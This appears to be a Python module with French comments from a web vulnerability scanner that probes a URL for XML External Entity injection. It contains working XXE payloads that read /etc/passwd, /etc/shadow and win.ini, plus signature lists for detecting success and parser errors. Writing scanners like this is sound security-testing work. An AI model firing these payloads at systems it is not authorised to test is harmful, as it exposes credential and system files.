#!/usr/bin/env python3
# coding:utf-8
"""
Module de détection d'injection XXE (XML External Entity).

Logique de détection :
  - Envoie des payloads XXE en POST avec Content-Type application/xml
  - Détection directe : présence du contenu de /etc/passwd dans la réponse
  - Détection indirecte : erreur de parsing XML révélant que le DTD est interprété
"""
import time
import requests

DELAY = 0.5
TIMEOUT = 10

# Payloads XXE — lecture de fichier local et provocation d'erreur parser
XXE_PAYLOADS = [
    # Linux — lecture /etc/passwd
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
        '<root>&xxe;</root>',
        "xxe_lfi_linux",
    ),
    # Windows — lecture win.ini
    (
        '<?xml version="1.0" encoding="UTF-8"?>'
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>'
        '<root>&xxe;</root>',
        "xxe_lfi_windows",
    ),
    # Erreur intentionnelle pour révéler le parsing DTD
    (
        '<?xml version="1.0"?>'
        '<!DOCTYPE data [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>'
        '<data>&xxe;</data>',
        "xxe_shadow",
    ),
]

# Signatures de lecture de fichier réussie
SUCCESS_SIGNATURES = [
    "root:x:", "root:0:0", "daemon:", "nobody:", "bin:",  # /etc/passwd
    "[boot loader]", "[operating systems]",                # win.ini
    "for 16-bit app support",
]

# Signatures d'erreur révélant que le parser XML a traité le DTD
PARSER_ERROR_SIGNATURES = [
    "xml parsing error", "xml parse error", "xmlparseexception",
    "unexpected end of file", "invalid xml", "malformed xml",
    "external entity", "dtd is prohibited",
    "access to the feature",
    "javax.xml.parsers", "org.xml.sax",
    "system identifier", "entity reference",
]

XML_CONTENT_TYPES = [
    "application/xml; charset=utf-8",
    "text/xml; charset=utf-8",
]


def scan(url: str, session: requests.Session) -> list[dict]:
    """
    Tente de détecter des vulnérabilités XXE via des requêtes POST avec payloads XML.
    """
    findings = []

    for payload_body, payload_id in XXE_PAYLOADS:
        for content_type in XML_CONTENT_TYPES:
            time.sleep(DELAY)
            try:
                res = session.post(
                    url,
                    data=payload_body.encode("utf-8"),
                    headers={"Content-Type": content_type},
                    timeout=TIMEOUT,
                )
                # Ignorer les erreurs 404/415 (endpoint ne supporte pas XML)
                if res.status_code in (404, 415, 405):
                    continue

                resp_lower = res.text.lower()

                # Détection directe (LFI via XXE)
                for sig in SUCCESS_SIGNATURES:
                    if sig.lower() in resp_lower:
                        findings.append({
                            "type": "XXE_LOCAL_FILE_INCLUSION",
                            "severity": "critical",
                            "url": url,
                            "detail": (
                                "Injection XXE réussie : l'endpoint parse les entités XML externes "
                                "et expose le contenu de fichiers locaux."
                            ),
                            "evidence": f"Signature '{sig}' trouvée | Content-Type: {content_type}",
                        })
                        return findings  # Trouver un seul suffit

                # Détection indirecte (erreur de parser)
                for sig in PARSER_ERROR_SIGNATURES:
                    if sig in resp_lower:
                        findings.append({
                            "type": "XXE_PARSER_ERROR_DISCLOSURE",
                            "severity": "high",
                            "url": url,
                            "detail": (
                                "L'endpoint parse du XML et révèle des erreurs internes. "
                                "Potentiellement vulnérable aux injections XXE."
                            ),
                            "evidence": f"Erreur parser : '{sig}' | status {res.status_code}",
                        })
                        return findings

            except Exception:
                continue

    return findings
